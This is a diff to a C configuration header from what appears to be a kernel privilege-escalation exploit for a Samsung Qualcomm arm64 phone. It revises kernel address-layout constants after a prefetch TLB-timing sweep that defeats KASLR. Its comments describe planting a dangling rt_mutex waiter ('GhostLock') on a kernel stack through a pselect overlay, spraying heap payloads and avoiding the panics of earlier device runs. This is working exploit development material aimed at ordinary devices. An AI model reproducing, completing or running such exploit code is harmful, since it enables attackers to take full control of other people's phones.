@@ -27,32 +27,40 @@
 #endif
 
 /* ---------------- address space ----------------
- * Linear-map math (verified against upstream tokay target + arm64 source):
- *   linear_VA(phys) = PAGE_OFFSET + (phys - memstart_addr)
- * and memstart_addr = round_down(dram_start, 1GB) = 0x80000000 here, unless
- * memstart_offset_seed (top 16 bits of kaslr-seed) randomizes it per boot
- * (qcom/Pixel bootloaders evidently keep it at the DRAM base: the upstream
- * exploit relies on a fixed linear alias of the kernel image).
- * Samsung qcom aboot relocates the kernel Image into its KASLR region at a
- * FIXED physical address: the live device tree carries reserved-memory/
- * kaslr_region@A0001000 (added by aboot at boot, absent from the base DTB)
- * and the node name is identical across reboots (verified twice). Only the
- * VIRTUAL slide is per-boot random (CONFIG_RANDOMIZE_BASE=y + chosen/
- * kaslr-seed). The alias formula then yields, for shift = 0:
- *   alias(symbol) = PAGE_OFFSET + 0x20001000 + (symbol - KIMAGE_TEXT_BASE)
- * The initial aboot load next to hyp@80000000 is a stale pre-RELA copy the
- * kernel no longer runs from. All evidence from the live /proc/device-tree
- * reserved-memory node names (hyp@80000000, xbl_aop@80700000, smem@80900000,
- * pil_*@86xxxxxx) and two-identical-reboots kaslr_region observation. */
+ * VERIFIED ON DEVICE (tools/prefetch_probe.c, EL0 PRFM TLB-timing sweep of
+ * the full TTBR1 space, 2026-11-05 run): the kernel is built for the VA39
+ * layout, not VA48:
+ *   PAGE_OFFSET (linear map base) = 0xffffffc000000000
+ *     (= 0xffffffffffffffff - (1 << 38) + 1, the stock arm64 VA39 constant)
+ *   vmalloc/image region         = [0xffffff8000000000, 0xffffffc000000000)
+ *     kernel image links at 0xffffff8008080000 (KIMAGE_TEXT_BASE below)
+ *   vmemmap                      = 0xffffffbf00000000 (= PAGE_OFFSET - 4GB,
+ *     the stock VMEMMAP_START for VA39/4K; probed hot 12/12 passes -
+ *     struct pages are touched by the kernel constantly)
+ * The sweep also showed the image running AT ITS LINK ADDRESS this boot
+ * (5 hot-text hits inside the link span, none elsewhere): slide = 0 for
+ * this boot. The slide is per-boot random, so the slide stage still runs,
+ * but at slide = 0 every *_IMAGE macro below is already the runtime VA.
+ *
+ * All earlier device panics are explained: the old constants assumed the
+ * VA48 PAGE_OFFSET 0xffffff8000000000, so every planted "alias" VA was
+ * ~264GB away from any mapping and the first rt_mutex walk deref faulted.
+ *
+ * Linear-map math: linear_VA(phys) = PAGE_OFFSET + (phys - memstart_addr),
+ * memstart_addr = dram base (0x80000000) minus the per-boot memstart
+ * randomization draw (1GB steps). The prefetch sweep's hot-heap cluster
+ * [PO+0.78G, PO+10.98G] bounds the draw to {2,3} this boot; exact value
+ * comes from the leak chain once reads work.
+ */
 #define KIMAGE_TEXT_BASE 0xffffff8008080000ULL          /* [A] kallsyms _text */
-#define P0_PAGE_OFFSET 0xffffff8000000000ULL            /* [A] CONFIG_ARM64_VA_BITS_39 */
+#define P0_PAGE_OFFSET 0xffffffc000000000ULL             /* [A][probe] VA39 PAGE_OFFSET, sweep-verified */
 #define P0_PHYS_OFFSET 0x80000000ULL                     /* [D] memstart_addr base = DRAM base */
-#define P0_KERNEL_PHYS_LOAD 0xA0001000ULL              /* [D] aboot KASLR relocation target (reserved-memory/kaslr_region@A0001000, fixed across reboots) */
+#define P0_KERNEL_PHYS_LOAD 0xA0001000ULL              /* [A] kaslr_region node base (aboot-injected) */
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
-#define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL /* [B] 16GB window (S20U 12/16GB) */
-#define DIRECT_MAP_BASE 0xffffff8000000000ULL
-#define DIRECT_MAP_END 0xffffffc000000000ULL           /* [B] 16GB */
-#define VMEMMAP_START 0xffffffbc00000000ULL             /* [B] 4.19 39-bit layout */
+#define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL /* [B] vmalloc+linear span */
+#define DIRECT_MAP_BASE 0xffffffc000000000ULL           /* [probe] linear map base */
+#define DIRECT_MAP_END 0xffffffc400000000ULL           /* [B] 16GB window */
+#define VMEMMAP_START 0xffffffbf00000000ULL             /* [probe] VA39 vmemmap, hot 12/12 */
 
 #define PSELECT_WAITER_WORD_SHIFT 1                     /* [D] stack-frame tuning, confirm at runtime */
 
@@ -136,7 +144,7 @@
 #define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
 #define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
 
-/* ---------------- slide mirror scratch (KASLR-independent) ----------------
+/* ---------------- slide mirror scratch ----------------
  * The GhostLock dangling waiter lives on the waiter task's kernel stack
  * (overlaid by the pselect fd_set copy), so the slide route never touches
  * heap-reclaimed memory: the only payload page the walk dereferences is
@@ -144,15 +152,13 @@
  * waiters.rb_root_cached=0, owner=0 — see prepare_skb_payload SLIDE branch).
  * The .bss tail gap [0xffffff800c0b2000, 0xffffff800c14a000) has no symbols
  * and zero adrp references from the entire kernel image (verified offline).
- * Like every planted pointer in this exploit, the scratch must go through
- * P0_DATA_ALIAS_CONST (direct-map alias, KASLR-independent): the raw link VA
- * is NOT the alias — first device run with the raw VA panicked instantly
- * (it points at ordinary RAM ~200MB, far below the kernel image). */
+ * At slide = 0 (probe-verified this boot) the raw image VA is the runtime
+ * VA directly: the earlier alias indirection was what made the first
+ * device runs deref unmapped memory and panic at the slide child. */
 #define SLIDE_MIRROR_MODE 1
 #define SLIDE_MIRROR_LOCK_OFF 0x04070000ULL            /* [A] .bss tail gap, page-aligned */
 #define SLIDE_MIRROR_LOCK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_MIRROR_LOCK_OFF)
-/* resolved in common.h after P0_DATA_ALIAS_CONST is available: */
-#define SLIDE_MIRROR_LOCK P0_DATA_ALIAS_CONST(SLIDE_MIRROR_LOCK_IMAGE)
+#define SLIDE_MIRROR_LOCK SLIDE_MIRROR_LOCK_IMAGE      /* [probe] slide=0: raw image VA */
 
 /* ---------------- exploit-internal spray layout (target-independent) ---------------- */
 #define LOCK_OFF 0x1350
